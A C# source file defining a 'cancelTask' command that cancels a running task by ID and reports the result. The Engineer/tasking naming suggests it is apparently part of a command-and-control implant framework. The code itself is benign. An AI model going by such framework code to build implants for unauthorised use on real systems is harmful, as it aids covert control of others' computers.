using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class CancelTask : EngineerCommand
    {
        public override string Name => "cancelTask";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/TaskId", out string canceltaskId);
            // Find the task and cancel its CancellationToken
            var taskToCancel = Tasking.engTaskDic[canceltaskId];

            // Find the CancellationTokenSource for the task and cancel it
            if (Tasking.cancellationTokenSourceDic.TryGetValue(canceltaskId, out CancellationTokenSource cts))
            {
                cts.Cancel();
            }
            else
            {
                Tasking.FillTaskResults($"Failed to find CancellationTokenSource for task {canceltaskId}", task, EngTaskStatus.Failed, TaskResponseType.String);
                return;
            }

            // Call FillTaskResult saying we cancelled the task
            Tasking.FillTaskResults($"Cancelled task {canceltaskId}", task, EngTaskStatus.Complete, TaskResponseType.String);
        }
    }
}
